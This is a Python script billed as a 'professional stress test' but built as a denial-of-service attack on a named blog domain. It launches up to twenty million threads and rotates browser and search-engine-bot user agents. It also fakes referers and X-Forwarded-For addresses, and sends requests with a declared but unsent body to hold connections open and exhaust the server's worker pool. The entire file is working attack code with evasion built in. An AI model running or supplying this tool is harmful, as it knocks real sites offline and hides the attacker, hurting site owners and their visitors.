import socket
import ssl
import threading
import random
import time
from collections import Counter

# --- TARGET CONFIG ---
TARGET_HOST = 'blog.akashsutradhar.me'  # Replace with your target domain
TARGET_PORT = 443
MAX_THREADS = 20000000      # Target high concurrency
RAMP_UP_TIME = 25       # Seconds to reach MAX_THREADS
TEST_DURATION = 120    

# --- ULTRA-DIVERSE USER AGENTS (25+ Identities) ---
USER_AGENTS = [
    # Desktop - Windows/Mac/Linux
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    
    # Mobile - iOS (iPhone/iPad)
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    
    # Mobile - Android (Samsung, Pixel, OnePlus)
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RVL-AL09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    
    # Search Engine Bots & Crawlers
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; Angel; +https://duckduckgo.com/duckduckbot)",
    
    # Legacy & Specialty
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/107.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    ]

# --- RANDOM REFERERS ---
REFERERS = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://t.co/", 
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.zeromove.in/shop",
    "https://www.linkedin.com/"
]

# Stats tracking
lock = threading.Lock()
stats = {'reqs': 0, 'errs': 0, 'codes': Counter()}
stop_event = threading.Event()

def worker(ip):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while not stop_event.is_set():
        try:
            with socket.create_connection((ip, TARGET_PORT), timeout=8) as sock:
                with context.wrap_socket(sock, server_hostname=TARGET_HOST) as ssock:
                    
                    # Randomize identity for each connection
                    ua = random.choice(USER_AGENTS)
                    ref = random.choice(REFERERS)
                    
                    # 503 Injection Header
                    request = (
                        f"GET /search?q={random.getrandbits(32)} HTTP/1.1\r\n"
                        f"Host: {TARGET_HOST}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Referer: {ref}\r\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.1\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Content-Length: {random.randint(20, 100)}\r\n" # Hold server for body
                        f"\r\n"
                    ).encode('ascii')

                    ssock.sendall(request)
                    
                    # "Clog" the worker pool for a random duration
                    time.sleep(random.uniform(2, 6)) 
                    
                    ssock.settimeout(1.5)
                    response = ssock.recv(1024)
                    
                    if response:
                        status = response.split(b'\r\n')[0].decode(errors='ignore')
                        with lock:
                            stats['reqs'] += 1
                            stats['codes'][status[:15]] += 1
                        
        except Exception:
            with lock: stats['errs'] += 1
            time.sleep(0.05)

def monitor():
    start_time = time.time()
    while not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        with lock:
            active = threading.active_count()
            print(f"[{int(elapsed)}s] Requests: {stats['reqs']} | Faults: {stats['errs']} | Threads: {active}", end='\r')

def main():
    try:
        target_ip = socket.gethostbyname(TARGET_HOST)
    except: 
        print("[!] DNS Resolution Error.")
        return

    print(f"[*] STARTING PROFESSIONAL STRESS TEST: {TARGET_HOST}")
    print(f"[*] Strategy: 503 Injection via Worker Pool Exhaustion")
    
    threading.Thread(target=monitor, daemon=True).start()

    threads = []
    for i in range(MAX_THREADS):
        if stop_event.is_set(): break
        t = threading.Thread(target=worker, args=(target_ip,), daemon=True)
        t.start()
        threads.append(t)
        # Faster ramp-up for stress testing
        time.sleep(RAMP_UP_TIME / MAX_THREADS)

    try:
        time.sleep(TEST_DURATION)
    except KeyboardInterrupt:
        print("\n[!] User Interruption.")
    
    stop_event.set()
    print("\n\n[*] FINAL RESPONSE LOG:")
    for code, count in stats['codes'].items():
        print(f" -> {code}: {count}")

if __name__ == "__main__":
    main()